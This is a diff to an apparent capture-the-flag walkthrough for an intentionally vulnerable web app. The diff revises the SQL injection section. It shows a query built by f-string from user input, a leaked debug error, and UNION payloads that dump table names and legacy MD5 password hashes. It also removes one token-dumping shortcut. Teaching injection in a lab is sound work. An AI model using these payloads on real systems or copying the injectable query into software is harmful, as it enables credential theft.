@@ -78,7 +78,7 @@ http://<ip>:8080/search?q=test
 The page has a search bar and returns messages and users. What the page doesn't advertise is a third query running in the background: an internal "token lookup" that looks up users by their API token. This query is in `routes/search2.py`:
 
 ```python
-sql = f"SELECT id, username, api_token FROM users WHERE api_token = '{query}'"
+sql = f"SELECT id, username, display_name FROM users WHERE api_token = '{query}'"
 cursor.execute(sql)
 token_results = cursor.fetchall()
 ```
@@ -87,7 +87,7 @@ The query result is passed to the template as `token_results`. Normal searches r
 
 ### The Injection
 
-The UNION attack works by appending a second SELECT that returns the same number of columns as the original (`id`, `username`, `api_token`). We want the `password_resets` table, which has columns `id`, `user_id`, `token`.
+The UNION attack works by appending a second SELECT that returns the same number of columns as the original (3 columns). We want the `password_resets` table, which has columns `id`, `user_id`, `token`.
 
 Navigate to:
 
@@ -119,13 +119,13 @@ The page fires a JavaScript `alert()` popup and renders an inline warning banner
 
 ```
 [DEBUG] Internal error in token subsystem:
-Query: SELECT id, username, api_token FROM users WHERE api_token = '''
+Query: SELECT id, username, display_name FROM users WHERE api_token = '''
 Error: near "'": syntax error
 ```
 
 This immediately reveals:
 1. Your input is injected directly into a SQL string after `api_token = '`
-2. The exact query structure and all 3 column names (`id`, `username`, `api_token`)
+2. The full query structure and the 3 column positions needed for a UNION attack
 3. The injection is string-based — close the quote and use UNION to redirect the query
 
 With this information you can construct the UNION payload directly.
@@ -138,12 +138,14 @@ You can extend the attack to pull more information:
 # Dump all tables
 ' UNION SELECT id, name, 'x' FROM sqlite_master WHERE type='table' --
 
-# Dump all users including password hashes
-' UNION SELECT id, username, password_hash FROM users --
-
 # Pull the legacy MD5 hashes (Flag 3 hint)
 ' UNION SELECT id, username, legacy_password_hash FROM users --
 ```
+
+> **Note:** Some columns and tables are restricted by a SQLite authorizer on this query.
+> `api_token` and `password_hash` return `NULL`. `dm_messages` and `dm_conversations`
+> raise a hard error. `legacy_password_hash` is intentionally readable as it is part of
+> the crypto challenge chain.
 
 ---
 
@@ -328,13 +330,7 @@ And the bot account `compliancebot` visits every DM conversation every 60 second
 
 ### Skip sarah_chen: Direct SQLi on password_resets
 
-If you find bob's token via the SQLi directly (not his API token, but checking if any tokens are static):
-
-```sql
-' UNION SELECT id, username, api_token FROM users WHERE username='manager_bob' --
-```
-
-This dumps `manager_bob`'s token in one step — skipping the reset token path entirely. The longer path via sarah_chen is the "intended" route, but this shortcut works because the IDOR and the SQLi both lead to the same destination.
+The `api_token` column is protected on this query (returns `NULL`), so the only SQLi path to bob's token is via the intended `password_resets` → account takeover → IDOR chain.
 
 ### Web UI Instead of curl
 
